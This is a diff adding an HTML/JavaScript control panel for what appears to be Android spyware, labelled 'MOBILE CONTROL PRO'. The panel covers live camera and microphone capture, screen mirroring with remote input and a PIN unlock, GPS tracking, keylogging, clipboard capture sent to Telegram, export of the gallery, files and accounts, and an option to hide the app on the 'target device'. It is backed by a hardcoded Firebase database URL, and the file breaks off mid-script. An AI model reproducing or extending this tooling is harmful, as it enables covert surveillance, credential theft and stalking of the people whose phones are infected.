@@ -1,0 +1,1547 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, viewport-fit=cover">
+    <title>MOBILE CONTROL PRO | Control Center</title>
+    <script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-app.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-auth.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-database.js"></script>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
+    <link rel="stylesheet" href="https://unpkg.com/leaflet@1.7.1/dist/leaflet.css" />
+    <script src="https://unpkg.com/leaflet@1.7.1/dist/leaflet.js"></script>
+    <link href="https://fonts.googleapis.com/css2?family=Space+Grotesk:wght@400;700;900&display=swap" rel="stylesheet">
+    <style>
+        * { box-sizing: border-box; margin: 0; padding: 0; }
+
+        :root {
+            --bg: #C8C8C8;
+            --black: #0A0A0A;
+            --yellow: #FFE135;
+            --red: #FF3B30;
+            --green: #00C853;
+            --blue: #2979FF;
+            --pink: #FF2D78;
+            --border: 3px solid #0A0A0A;
+            --shadow: 4px 4px 0px #0A0A0A;
+            --shadow-lg: 6px 6px 0px #0A0A0A;
+        }
+
+        body {
+            font-family: 'Space Grotesk', sans-serif;
+            background: var(--bg);
+            color: var(--black);
+            display: flex;
+            height: 100vh;
+            overflow: hidden;
+        }
+
+        /* ===== SIDEBAR ===== */
+        .sidebar {
+            width: 240px;
+            background: var(--black);
+            border-right: var(--border);
+            display: flex;
+            flex-direction: column;
+            flex-shrink: 0;
+            z-index: 1000;
+            transition: left 0.3s ease;
+        }
+
+        .sidebar-logo {
+            padding: 20px;
+            border-bottom: var(--border);
+            background: var(--yellow);
+        }
+
+        .sidebar-logo h2 {
+            font-size: 1.1rem;
+            font-weight: 900;
+            color: var(--black);
+            letter-spacing: -0.5px;
+            text-transform: uppercase;
+        }
+
+        .sidebar-logo .device-tag {
+            font-size: 0.65rem;
+            font-weight: 700;
+            color: var(--black);
+            opacity: 0.7;
+            margin-top: 4px;
+            text-transform: uppercase;
+            letter-spacing: 1px;
+        }
+
+        .nav-group {
+            flex-grow: 1;
+            padding: 12px;
+            overflow-y: auto;
+        }
+
+        .nav-item {
+            display: flex;
+            align-items: center;
+            gap: 12px;
+            padding: 12px 16px;
+            cursor: pointer;
+            font-weight: 700;
+            font-size: 0.85rem;
+            text-transform: uppercase;
+            letter-spacing: 0.5px;
+            color: #888;
+            border-radius: 0;
+            border: 2px solid transparent;
+            margin-bottom: 4px;
+            transition: all 0.15s ease;
+            text-decoration: none;
+        }
+
+        .nav-item i { width: 18px; text-align: center; font-size: 0.9rem; }
+
+        .nav-item:hover {
+            color: var(--yellow);
+            background: rgba(255,225,53,0.08);
+            border-color: var(--yellow);
+        }
+
+        .nav-item.active {
+            background: var(--yellow);
+            color: var(--black);
+            border: 2px solid var(--black);
+            box-shadow: var(--shadow);
+        }
+
+        .sidebar-footer {
+            padding: 15px;
+            border-top: var(--border);
+        }
+
+        /* ===== MAIN CONTENT ===== */
+        .main-content {
+            flex-grow: 1;
+            display: flex;
+            flex-direction: column;
+            overflow: hidden;
+        }
+
+        /* ===== TOPBAR ===== */
+        .topbar {
+            background: var(--black);
+            color: var(--yellow);
+            padding: 14px 24px;
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            border-bottom: var(--border);
+            flex-wrap: wrap;
+            gap: 10px;
+        }
+
+        .topbar h1 {
+            font-size: 1.1rem;
+            font-weight: 900;
+            letter-spacing: -0.5px;
+            text-transform: uppercase;
+        }
+
+        .topbar .health-bar {
+            display: flex;
+            align-items: center;
+            gap: 10px;
+            font-size: 0.75rem;
+            font-weight: 700;
+        }
+
+        .topbar .health-bar span {
+            background: rgba(255,255,255,0.08);
+            border: 1px solid rgba(255,225,53,0.3);
+            padding: 4px 10px;
+            font-weight: 700;
+        }
+
+        .status-badge {
+            font-weight: 900;
+            font-size: 0.7rem;
+            padding: 5px 14px;
+            border: 2px solid var(--black);
+            text-transform: uppercase;
+            letter-spacing: 1px;
+        }
+
+        .status-badge.online { background: var(--green); color: var(--black); }
+        .status-badge.offline { background: var(--red); color: white; }
+
+        /* ===== CONTENT BODY ===== */
+        .content-body {
+            flex-grow: 1;
+            overflow-y: auto;
+            padding: 20px;
+            max-width: 1100px;
+            width: 100%;
+            align-self: center;
+        }
+
+        /* ===== CARDS ===== */
+        .card {
+            background: #DCDCDC;
+            border: var(--border);
+            box-shadow: var(--shadow-lg);
+            padding: 20px;
+            margin-bottom: 20px;
+        }
+
+        .card-title {
+            font-size: 0.8rem;
+            font-weight: 900;
+            text-transform: uppercase;
+            letter-spacing: 1px;
+            color: var(--black);
+            margin-bottom: 16px;
+            padding-bottom: 10px;
+            border-bottom: 2px solid var(--black);
+            display: flex;
+            align-items: center;
+            gap: 8px;
+        }
+
+        .card-title i { color: var(--blue); }
+
+        /* ===== BUTTONS ===== */
+        .btn {
+            display: inline-flex;
+            align-items: center;
+            justify-content: center;
+            gap: 8px;
+            padding: 9px 18px;
+            font-family: 'Space Grotesk', sans-serif;
+            font-weight: 900;
+            font-size: 0.75rem;
+            text-transform: uppercase;
+            letter-spacing: 0.5px;
+            cursor: pointer;
+            border: 2px solid var(--black);
+            box-shadow: 3px 3px 0px var(--black);
+            transition: all 0.1s ease;
+        }
+
+        .btn:active { box-shadow: 0px 0px 0px var(--black); transform: translate(3px, 3px); }
+
+        .btn-yellow { background: var(--yellow); color: var(--black); }
+        .btn-red { background: var(--red); color: white; }
+        .btn-green { background: var(--green); color: var(--black); }
+        .btn-blue { background: var(--blue); color: white; }
+        .btn-pink { background: var(--pink); color: white; }
+        .btn-black { background: var(--black); color: var(--yellow); }
+
+        /* ===== PAGES ===== */
+        .page { display: none; }
+        .page.active { display: block; }
+
+        /* ===== CAMERA ===== */
+        #stream-img {
+            width: 100%;
+            border: var(--border);
+            min-height: 220px;
+            object-fit: contain;
+            background: var(--black);
+            display: block;
+        }
+
+        .cam-controls {
+            display: flex;
+            align-items: center;
+            gap: 8px;
+            flex-wrap: wrap;
+            margin-top: 12px;
+        }
+
+        .quality-box {
+            display: flex;
+            align-items: center;
+            gap: 8px;
+            border: 2px solid var(--black);
+            padding: 6px 12px;
+            background: var(--bg);
+            font-size: 0.7rem;
+            font-weight: 700;
+        }
+
+        /* ===== PERMISSIONS ===== */
+        .perm-grid { display: grid; grid-template-columns: repeat(auto-fill, minmax(140px, 1fr)); gap: 8px; margin-top: 12px; }
+        .perm-item {
+            padding: 10px 12px;
+            border: 2px solid var(--black);
+            display: flex;
+            align-items: center;
+            gap: 8px;
+            font-size: 0.75rem;
+            font-weight: 700;
+            text-transform: capitalize;
+        }
+        .perm-ok { color: var(--green); }
+        .perm-no { color: var(--red); }
+
+        /* ===== FEATURES GRID ===== */
+        .feat-grid { display: grid; grid-template-columns: repeat(auto-fill, minmax(120px, 1fr)); gap: 10px; margin-top: 12px; }
+        .feat-item {
+            padding: 16px 10px;
+            border: 2px solid var(--black);
+            text-align: center;
+            cursor: pointer;
+            background: var(--bg);
+            box-shadow: 3px 3px 0px var(--black);
+            transition: all 0.1s;
+        }
+        .feat-item.active { background: var(--yellow); box-shadow: none; transform: translate(3px, 3px); }
+        .feat-item i { font-size: 1.3rem; display: block; margin-bottom: 6px; }
+        .feat-label { font-size: 0.7rem; font-weight: 900; text-transform: uppercase; }
+
+        /* ===== COMMANDS GRID ===== */
+        .cmd-grid { display: grid; grid-template-columns: repeat(auto-fill, minmax(130px, 1fr)); gap: 10px; }
+
+        /* ===== GPS ===== */
+        #gps-map { height: 340px; border: var(--border); }
+
+        /* ===== KEYLOG ===== */
+        #keylogs-list {
+            max-height: 400px;
+            overflow-y: auto;
+            font-size: 0.8rem;
+        }
+
+        .log-row {
+            padding: 8px 12px;
+            border-bottom: 2px solid var(--black);
+            font-weight: 600;
+        }
+        .log-row:last-child { border-bottom: none; }
+
+        /* ===== ACCOUNTS ===== */
+        .acc-table { width: 100%; border-collapse: collapse; font-size: 0.8rem; }
+        .acc-table th { background: var(--black); color: var(--yellow); padding: 10px 12px; text-transform: uppercase; font-size: 0.7rem; letter-spacing: 1px; text-align: left; }
+        .acc-table td { padding: 10px 12px; border-bottom: 2px solid var(--black); font-weight: 600; }
+        .acc-table tr:nth-child(even) td { background: var(--bg); }
+
+        /* ===== MIC ===== */
+        .mic-center { text-align: center; padding: 20px 0; }
+        .mic-center i { font-size: 3rem; color: var(--black); }
+        .mic-center.active i { color: var(--red); animation: pulse 1s ease-in-out infinite; }
+        @keyframes pulse { 0%,100% { transform: scale(1); } 50% { transform: scale(1.15); } }
+
+        /* ===== HAMBURGER ===== */
+        .hamburger {
+            display: none;
+            background: var(--yellow);
+            border: 2px solid var(--black);
+            box-shadow: var(--shadow);
+            padding: 8px 12px;
+            cursor: pointer;
+            font-size: 1rem;
+            font-weight: 900;
+        }
+
+        /* ===== OVERLAY ===== */
+        .overlay {
+            display: none;
+            position: fixed;
+            inset: 0;
+            background: rgba(0,0,0,0.5);
+            z-index: 999;
+        }
+        .overlay.active { display: block; }
+
+        /* ===== RESPONSIVE ===== */
+        @media (max-width: 768px) {
+            body { flex-direction: column; overflow: hidden; }
+
+            .sidebar {
+                position: fixed;
+                left: -260px;
+                top: 0;
+                bottom: 0;
+                width: 240px;
+            }
+            .sidebar.open { left: 0; }
+
+            .hamburger { display: inline-flex; align-items: center; gap: 6px; }
+
+            .topbar h1 { font-size: 0.95rem; }
+            .content-body { padding: 12px; }
+
+            .cam-controls { gap: 6px; }
+            .btn { padding: 8px 12px; font-size: 0.7rem; }
+
+            .cmd-grid { grid-template-columns: repeat(2, 1fr); }
+            .perm-grid { grid-template-columns: repeat(2, 1fr); }
+            .feat-grid { grid-template-columns: repeat(3, 1fr); }
+        }
+
+        @media (max-width: 400px) {
+            .feat-grid { grid-template-columns: repeat(2, 1fr); }
+            #gps-map { height: 260px; }
+        }
+
+        /* Scrollbar */
+        ::-webkit-scrollbar { width: 6px; }
+        ::-webkit-scrollbar-track { background: var(--bg); }
+        ::-webkit-scrollbar-thumb { background: var(--black); }
+
+        /* ===== SCREEN MIRROR ===== */
+        .screen-wrapper {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            gap: 0;
+        }
+
+        .screen-header {
+            background: #0a0a0a;
+            border: 2px solid #00C853;
+            border-bottom: none;
+            padding: 8px 14px;
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            width: 100%;
+            max-width: 380px;
+            border-radius: 8px 8px 0 0;
+        }
+
+        .screen-header-left {
+            display: flex;
+            align-items: center;
+            gap: 8px;
+        }
+
+        .screen-header-left .status-dot {
+            width: 12px;
+            height: 12px;
+            background: #00C853;
+            border-radius: 2px;
+        }
+
+        .screen-header-left .status-dot.offline {
+            background: #FF3B30;
+        }
+
+        .screen-header-info {
+            font-size: 0.65rem;
+            color: #aaa;
+            font-weight: 600;
+        }
+
+        .screen-header-info span {
+            color: #00C853;
+            font-weight: 700;
+        }
+
+        .screen-header-controls {
+            display: flex;
+            gap: 6px;
+        }
+
+        .screen-header-controls button {
+            background: rgba(255,255,255,0.08);
+            border: 1px solid rgba(255,255,255,0.15);
+            color: #fff;
+            width: 28px;
+            height: 28px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            cursor: pointer;
+            font-size: 0.7rem;
+            border-radius: 4px;
+            transition: all 0.15s;
+        }
+
+        .screen-header-controls button:hover {
+            background: #00C853;
+            color: #000;
+        }
+
+        .screen-header-controls button.active {
+            background: #00C853;
+            color: #000;
+        }
+
+        .screen-toolbar {
+            background: #111;
+            border-left: 2px solid #00C853;
+            border-right: 2px solid #00C853;
+            padding: 6px 14px;
+            display: flex;
+            gap: 12px;
+            width: 100%;
+            max-width: 380px;
+        }
+
+        .screen-toolbar button {
+            background: transparent;
+            border: none;
+            color: #888;
+            cursor: pointer;
+            font-size: 1.1rem;
+            padding: 4px;
+            transition: color 0.15s;
+        }
+
+        .screen-toolbar button:hover {
+            color: #00C853;
+        }
+
+        .screen-container {
+            position: relative;
+            width: 100%;
+            max-width: 380px;
+            height: 620px;
+            background: #0a0a0a;
+            border-left: 2px solid #00C853;
+            border-right: 2px solid #00C853;
+            overflow: hidden;
+            user-select: none;
+            -webkit-user-select: none;
+        }
+
+        .screen-canvas {
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            overflow: hidden;
+        }
+
+        .screen-canvas .node {
+            position: absolute;
+            box-sizing: border-box;
+            overflow: hidden;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            border: 1px solid rgba(255, 255, 255, 0.05); /* Hidden by default but visible if needed */
+            transition: all 0.1s;
+        }
+
+        .screen-canvas .node.clickable {
+            border: 1px solid rgba(0, 200, 83, 0.4);
+            background: rgba(0, 200, 83, 0.08); /* More visible background */
+            box-shadow: 0 0 5px rgba(0, 200, 83, 0.1);
+        }
+
+        .screen-canvas .node.editable {
+            border: 1px solid rgba(33, 150, 243, 0.4);
+            background: rgba(33, 150, 243, 0.08);
+            box-shadow: 0 0 5px rgba(33, 150, 243, 0.1);
+        }
+
+        .screen-canvas .node.button-node {
+            border: 1px solid rgba(255, 255, 255, 0.4);
+            background: rgba(255, 255, 255, 0.12);
+            border-radius: 4px;
+        }
+
+        .screen-canvas .node.has-text {
+            background: rgba(255, 255, 255, 0.05); /* Slight tint for text containers */
+            backdrop-filter: blur(1px);
+        }
+
+        .screen-canvas .node-text {
+            font-family: 'Inter', 'Space Grotesk', sans-serif;
+            color: #FFFFFF; /* High contrast white */
+            line-height: 1.2;
+            white-space: nowrap;
+            overflow: hidden;
+            text-overflow: ellipsis;
+            padding: 2px 4px;
+            text-shadow: 0 1px 3px rgba(0,0,0,0.9);
+            font-weight: 600;
+            letter-spacing: 0.2px;
+        }
+
+        .screen-canvas .node.editable {
+            border-bottom: 1px solid rgba(0, 200, 83, 0.4);
+        }
+
+        .screen-canvas .node.image-node {
+            background: rgba(255,255,255,0.03);
+        }
+
+        .screen-canvas .node.button-node {
+            border-radius: 3px;
+        }
+
+        .screen-touch-overlay {
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            z-index: 100;
+            cursor: crosshair;
+        }
+
+        .tap-ripple {
+            position: absolute;
+            width: 30px;
+            height: 30px;
+            border-radius: 50%;
+            background: rgba(0, 200, 83, 0.4);
+            border: 2px solid #00C853;
+            transform: translate(-50%, -50%);
+            pointer-events: none;
+            animation: tapRipple 0.6s ease-out forwards;
+            z-index: 200;
+        }
+
+        @keyframes tapRipple {
+            0% { transform: translate(-50%, -50%) scale(0.3); opacity: 1; }
+            100% { transform: translate(-50%, -50%) scale(2); opacity: 0; }
+        }
+
+        .screen-nav {
+            background: #0a0a0a;
+            border: 2px solid #00C853;
+            border-top: 1px solid #222;
+            padding: 10px 0;
+            display: flex;
+            justify-content: center;
+            gap: 40px;
+            width: 100%;
+            max-width: 380px;
+            border-radius: 0 0 8px 8px;
+        }
+
+        .screen-nav button {
+            background: transparent;
+            border: none;
+            color: #888;
+            cursor: pointer;
+            font-size: 1.2rem;
+            padding: 6px 14px;
+            transition: all 0.15s;
+            border-radius: 4px;
+        }
+
+        .screen-nav button:hover {
+            color: #fff;
+            background: rgba(255,255,255,0.08);
+        }
+
+        .screen-text-bar {
+            display: flex;
+            gap: 0;
+            width: 100%;
+            max-width: 380px;
+            margin-top: 8px;
+        }
+
+        .screen-text-bar input {
+            flex: 1;
+            background: #1a1a1a;
+            border: 2px solid var(--black);
+            color: #fff;
+            padding: 10px 14px;
+            font-family: 'Space Grotesk', sans-serif;
+            font-size: 0.8rem;
+            font-weight: 600;
+            outline: none;
+        }
+
+        .screen-text-bar input::placeholder {
+            color: #555;
+        }
+
+        .screen-text-bar input:focus {
+            border-color: #00C853;
+        }
+
+        .screen-text-bar button {
+            background: var(--black);
+            border: 2px solid var(--black);
+            color: #00C853;
+            padding: 10px 18px;
+            font-family: 'Space Grotesk', sans-serif;
+            font-weight: 900;
+            font-size: 0.7rem;
+            cursor: pointer;
+            text-transform: uppercase;
+            letter-spacing: 0.5px;
+            transition: all 0.15s;
+        }
+
+        .screen-text-bar button:hover {
+            background: #00C853;
+            color: #000;
+        }
+
+        .screen-settings {
+            display: flex;
+            gap: 10px;
+            align-items: center;
+            flex-wrap: wrap;
+            width: 100%;
+            max-width: 380px;
+            margin-top: 10px;
+        }
+
+        .screen-settings label {
+            font-size: 0.65rem;
+            font-weight: 900;
+            text-transform: uppercase;
+            letter-spacing: 0.5px;
+            color: var(--black);
+        }
+
+        .screen-settings select,
+        .screen-settings input[type="range"] {
+            font-family: 'Space Grotesk', sans-serif;
+            font-weight: 700;
+            font-size: 0.7rem;
+            border: 2px solid var(--black);
+            padding: 4px 8px;
+            background: var(--bg);
+        }
+
+        .screen-empty {
+            position: absolute;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            text-align: center;
+            color: #444;
+        }
+
+        .screen-empty i {
+            font-size: 2.5rem;
+            margin-bottom: 12px;
+            display: block;
+        }
+
+        .screen-empty p {
+            font-size: 0.75rem;
+            font-weight: 700;
+        }
+
+        @media (max-width: 768px) {
+            .screen-container { height: 520px; max-width: 100%; }
+            .screen-header, .screen-toolbar, .screen-nav, .screen-text-bar, .screen-settings { max-width: 100%; }
+        }
+    </style>
+</head>
+<body>
+
+<div class="overlay" id="overlay" onclick="closeSidebar()"></div>
+
+<!-- SIDEBAR -->
+<div class="sidebar" id="sidebar">
+    <div class="sidebar-logo">
+        <h2>⚡ MOBILE CONTROL PRO</h2>
+        <div class="device-tag" id="active-device-tag">Control Active</div>
+    </div>
+    <div class="nav-group">
+        <div class="nav-item active" onclick="showPage('dashboard', this)"><i class="fas fa-video"></i> Live Camera</div>
+        <div class="nav-item" onclick="showPage('screen', this)"><i class="fas fa-desktop"></i> Screen Mirror</div>
+        <div class="nav-item" onclick="showPage('remote', this)"><i class="fas fa-terminal"></i> Actions</div>
+        <div class="nav-item" onclick="showPage('gps', this)"><i class="fas fa-location-dot"></i> GPS Track</div>
+        <div class="nav-item" onclick="showPage('keylogs', this)"><i class="fas fa-keyboard"></i> Keylogger</div>
+        <div class="nav-item" onclick="showPage('accounts', this)"><i class="fas fa-user-shield"></i> Accounts</div>
+    </div>
+    <div class="sidebar-footer">
+        <button class="btn btn-red" style="width:100%" onclick="window.close()"><i class="fas fa-power-off"></i> Close Session</button>
+    </div>
+</div>
+
+<!-- MAIN -->
+<div class="main-content">
+    <!-- TOPBAR -->
+    <div class="topbar">
+        <div style="display:flex; align-items:center; gap:12px;">
+            <button class="hamburger" onclick="openSidebar()"><i class="fas fa-bars"></i></button>
+            <div>
+                <h1 id="dev-name">Loading Device...</h1>
+                <div class="health-bar" id="health-bar"></div>
+            </div>
+        </div>
+        <div id="status-tag" class="status-badge offline">OFFLINE</div>
+    </div>
+
+    <!-- PAGES -->
+    <div class="content-body">
+
+        <!-- ========== LIVE CAMERA ========== -->
+        <div id="page-dashboard" class="page active">
+            <div class="card">
+                <div class="card-title"><i class="fas fa-camera"></i> Live Camera Feed</div>
+                <img id="stream-img" src="" alt="Camera Offline">
+                <div class="cam-controls">
+                    <div class="quality-box">
+                        <label>QUALITY:</label>
+                        <input type="range" id="stream-quality" min="1" max="100" value="25" style="width: 70px;">
+                    </div>
+                    <button class="btn btn-green" onclick="startStream('back')"><i class="fas fa-camera"></i> REAR</button>
+                    <button class="btn btn-blue" onclick="startStream('front')"><i class="fas fa-camera-rotate"></i> FRONT</button>
+                    <button class="btn btn-red" onclick="stopStream()"><i class="fas fa-stop"></i> STOP</button>
+                </div>
+            </div>
+        </div>
+
+        <!-- ========== SCREEN MIRROR ========== -->
+        <div id="page-screen" class="page">
+            <div class="card">
+                <div class="card-title"><i class="fas fa-desktop"></i> Live Screen Mirror</div>
+                <div class="screen-wrapper">
+                    <!-- Header -->
+                    <div class="screen-header">
+                        <div class="screen-header-left">
+                            <div class="status-dot" id="screen-status-dot"></div>
+                            <div class="screen-header-info">
+                                Screen reader | <span id="screen-device-name">--</span> | FPS: <span id="screen-fps">0</span>
+                            </div>
+                        </div>
+                        <div class="screen-header-controls">
+                            <button id="screen-pause-btn" onclick="toggleScreenPause()" title="Pause"><i class="fas fa-pause"></i></button>
+                            <button id="screen-start-btn" onclick="toggleScreenStream()" title="Start/Stop"><i class="fas fa-play"></i></button>
+                        </div>
+                    </div>
+
+                    <!-- Toolbar -->
+                    <div class="screen-toolbar">
+                        <button onclick="screenAction('notifications')" title="Notifications"><i class="fas fa-bell"></i></button>
+                        <button onclick="screenAction('quickSettings')" title="Quick Settings"><i class="fas fa-sliders-h"></i></button>
+                        <button onclick="screenAction('lockScreen')" title="Lock Screen"><i class="fas fa-lock"></i></button>
+                        <button onclick="promptUnlock()" title="Unlock Device with PIN"><i class="fas fa-unlock-keyhole"></i></button>
+                        <button onclick="refreshScreenTree()" title="Refresh"><i class="fas fa-sync-alt"></i></button>
+                    </div>
+
+                    <!-- Screen Area -->
+                    <div class="screen-container" id="screen-container">
+                        <div class="screen-canvas" id="screen-canvas"></div>
+                        <div class="screen-touch-overlay" id="screen-touch-overlay"></div>
+                        <div class="screen-empty" id="screen-empty">
+                            <i class="fas fa-mobile-screen"></i>
+                            <p>Click START to begin<br>screen rendering</p>
+                        </div>
+                    </div>
+
+                    <!-- Navigation Bar -->
+                    <div class="screen-nav">
+                        <button onclick="screenAction('recents')" title="Recent Apps"><i class="fas fa-bars"></i></button>
+                        <button onclick="screenAction('home')" title="Home"><i class="fas fa-circle"></i></button>
+                        <button onclick="screenAction('back')" title="Back"><i class="fas fa-caret-left" style="font-size:1.5rem"></i></button>
+                    </div>
+
+                    <!-- Text Input -->
+                    <div class="screen-text-bar">
+                        <input type="text" id="screen-text-input" placeholder="Send text..." onkeydown="if(event.key==='Enter')sendScreenText()">
+                        <button onclick="sendScreenText()">SEND</button>
+                    </div>
+
+                    <!-- Settings -->
+                    <div class="screen-settings">
+                        <label>Interval:</label>
+                        <select id="screen-interval" onchange="updateScreenConfig()">
+                            <option value="50">50ms (Ultra)</option>
+                            <option value="100">100ms (Pro)</option>
+                            <option value="200">200ms</option>
+                            <option value="350">350ms</option>
+                            <option value="500" selected>500ms</option>
+                            <option value="750">750ms</option>
+                            <option value="1000">1000ms</option>
+                            <option value="2000">2000ms</option>
+                        </select>
+                        
+                        <div style="display: flex; align-items: center; gap: 8px; margin-left: 15px;">
+                            <label style="margin: 0; font-size: 0.8rem; color: #aaa;">Privacy Screen:</label>
+                            <input type="checkbox" id="screen-privacy-toggle" onchange="updateScreenConfig()" style="width: 16px; height: 16px; cursor: pointer;">
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </div>
+
+        <!-- ========== ACTIONS ========== -->
+        <div id="page-remote" class="page">
+
+            <!-- MIC -->
+            <div class="card">
+                <div class="card-title"><i class="fas fa-microphone"></i> Microphone Recording</div>
+                <div class="mic-center" id="mic-wrapper">
+                    <i class="fas fa-microphone"></i>
+                    <div style="margin-top: 14px; display: flex; justify-content: center; gap: 10px; flex-wrap: wrap;">
+                        <button class="btn btn-green" onclick="mic(true)"><i class="fas fa-microphone"></i> START MIC</button>
+                        <button class="btn btn-red" onclick="mic(false)"><i class="fas fa-microphone-slash"></i> STOP MIC</button>
+                    </div>
+                </div>
+            </div>
+
+            <!-- PERMISSIONS -->
+            <div class="card">
+                <div class="card-title"><i class="fas fa-shield-halved"></i> App Permissions Status</div>
+                <div id="perm-list" class="perm-grid"><div class="perm-item">Waiting for sync...</div></div>
+                <button class="btn btn-yellow" style="margin-top:14px; width:100%;" onclick="cmd('checkPermissions', true)">
+                    <i class="fas fa-sync-alt"></i> REFRESH PERMISSIONS
+                </button>
+            </div>
+
+            <!-- FEATURE TOGGLES -->
+            <div class="card">
+                <div class="card-title"><i class="fas fa-toggle-on"></i> Features Toggle</div>
+                <div class="feat-grid">
+                    <div class="feat-item" id="feat-clipboard" onclick="toggleFeat('clipboard')">
+                        <i class="fas fa-paste"></i>
+                        <span class="feat-label">Clipboard</span>
+                    </div>
+                </div>
+
+                <!-- Clipboard Data Viewer -->
+                <div id="clipboard-panel" style="margin-top:16px; border: 2px solid var(--black); background: #1a1a1a;">
+                    <div style="background: var(--black); color: var(--yellow); padding: 8px 14px; font-size: 0.7rem; font-weight: 900; display: flex; justify-content: space-between; align-items: center;">
+                        <span><i class="fas fa-clipboard"></i> CLIPBOARD CAPTURE</span>
+                        <button class="btn btn-yellow" style="padding: 4px 12px; font-size: 0.65rem; box-shadow: none;" onclick="sendClipboardToTelegram()">
+                            <i class="fab fa-telegram"></i> SEND TO TG
+                        </button>
+                    </div>
+                    <div id="clipboard-content" style="padding: 12px 14px; color: #aaa; font-size: 0.78rem; font-family: monospace; min-height: 50px; max-height: 140px; overflow-y: auto; white-space: pre-wrap; word-break: break-all;">
+                        Clipboard empty. Enable toggle and copy something on target device.
+                    </div>
+                </div>
+            </div>
+
+            <!-- COMMANDS -->
+            <div class="card">
+                <div class="card-title"><i class="fas fa-bolt"></i> Remote Commands</div>
+                <div class="cmd-grid">
+                    <button class="btn btn-yellow" onclick="cmd('ring', true)"><i class="fas fa-bell"></i> ALARM</button>
+                    <button class="btn btn-blue" onclick="cmd('vibrate', 1000)"><i class="fas fa-vibrate"></i> VIBRATE</button>
+                    <button class="btn btn-black" onclick="cmd('exportGallery', true)"><i class="fas fa-images"></i> GALLERY</button>
+                    <button class="btn btn-black" onclick="cmd('exportFiles', true)"><i class="fas fa-folder-open"></i> FILE EXPORT</button>
+                </div>
+                <!-- Danger Zone -->
+                <div style="margin-top: 14px; border-top: 2px solid var(--black); padding-top: 14px;">
+                    <div style="font-size: 0.65rem; font-weight: 900; text-transform: uppercase; letter-spacing: 1px; color: var(--black); margin-bottom: 10px; opacity: 0.6;">⚠️ DANGER ZONE</div>
+                    <div style="display: grid; grid-template-columns: 1fr 1fr; gap: 10px;">
+                        <button class="btn btn-black" onclick="hideApp()" style="background: #333;"><i class="fas fa-eye-slash"></i> HIDE APP</button>
+                        <button class="btn btn-red" onclick="confirmUninstall()"><i class="fas fa-trash"></i> UNINSTALL</button>
+                    </div>
+                </div>
+            </div>
+        </div>
+
+        <!-- ========== GPS TRACKER ========== -->
+        <div id="page-gps" class="page">
+            <div class="card">
+                <div class="card-title" style="display:flex; justify-content:space-between; align-items:center; flex-wrap:wrap; gap:8px;">
+                    <span><i class="fas fa-location-dot"></i> GPS Location Tracker</span>
+                    <button class="btn btn-yellow" onclick="cmd('getGPS', true)"><i class="fas fa-crosshairs"></i> REFRESH LOCATION</button>
+                </div>
+                <div id="gps-map"></div>
+            </div>
+        </div>
+
+        <!-- ========== KEYLOGGER ========== -->
+        <div id="page-keylogs" class="page">
+            <div class="card">
+                <div class="card-title"><i class="fas fa-keyboard"></i> Keylogger Capture</div>
+                <div id="keylogs-list"><div class="log-row" style="color:#888;">No keylog data yet...</div></div>
+            </div>
+        </div>
+
+        <!-- ========== ACCOUNTS ========== -->
+        <div id="page-accounts" class="page">
+            <div class="card">
+                <div class="card-title" style="display:flex; justify-content:space-between; align-items:center; flex-wrap:wrap; gap:8px;">
+                    <span><i class="fas fa-user-shield"></i> System Accounts</span>
+                    <button class="btn btn-yellow" onclick="cmd('exportAccounts', true)"><i class="fas fa-sync-alt"></i> REFRESH</button>
+                </div>
+                <div style="overflow-x: auto;">
+                    <table class="acc-table">
+                        <thead><tr><th>Account Type</th><th>Account Name</th></tr></thead>
+                        <tbody id="accounts-body"><tr><td colspan="2" style="color:#888; text-align:center; padding:20px;">No account data yet...</td></tr></tbody>
+                    </table>
+                </div>
+            </div>
+        </div>
+
+    </div>
+</div>
+
+<script>
+    const userId = window.targetUserId;
+    const deviceId = window.targetDeviceId;
+    const databaseURL = window.masterFirebaseUrl || "https://test-web2-57cbb-default-rtdb.asia-southeast1.firebasedatabase.app/";
+
+    firebase.initializeApp({ databaseURL: databaseURL });
+    const database = firebase.database();
+
+    let map, marker, audioCtx, nextStartTime = 0;
+    let currentBattery = "--";
+
+    // Sidebar Mobile
+    function openSidebar() {
+        document.getElementById('sidebar').classList.add('open');
+        document.getElementById('overlay').classList.add('active');
+    }
+    function closeSidebar() {
+        document.getElementById('sidebar').classList.remove('open');
+        document.getElementById('overlay').classList.remove('active');
+    }
+
+    function showPage(id, el) {
+        document.querySelectorAll('.page').forEach(p => p.classList.remove('active'));
+        document.querySelectorAll('.nav-item').forEach(i => i.classList.remove('active'));
+        document.getElementById('page-' + id).classList.add('active');
+        if(el) el.classList.add('active');
+        closeSidebar();
+        if(id === 'gps' && map) setTimeout(() => map.invalidateSize(), 200);
+    }
+
+    function updateHealthBar() {
+        document.getElementById('health-bar').innerHTML =
+            `<span>🔋 ${currentBattery}%</span><span>📱 ${deviceId || 'Unknown'}</span>`;
+    }
+
+    if (userId && deviceId) {
+        startSync();
+    } else {
+        document.getElementById('dev-name').innerText = "No Device Selected";
+    }
+
+    function startSync() {
+        const base = `users/${userId}/devices/${deviceId}/`;
+
+        database.ref(base + 'health').on('value', s => {
+            const h = s.val() || {};
+            const st = document.getElementById('status-tag');
+            st.innerText = h.online ? 'ONLINE' : 'OFFLINE';
+            st.className = 'status-badge ' + (h.online ? 'online' : 'offline');
+            currentBattery = h.battery || "--";
+            updateHealthBar();
+        });
+
+        database.ref(base + 'info').on('value', s => {
+            const i = s.val() || {};
+            document.getElementById('dev-name').innerText = i.model || deviceId;
+            document.getElementById('active-device-tag').innerText = deviceId;
+            updateHealthBar();
+        });
+
+        database.ref(base + 'features').on('value', s => {
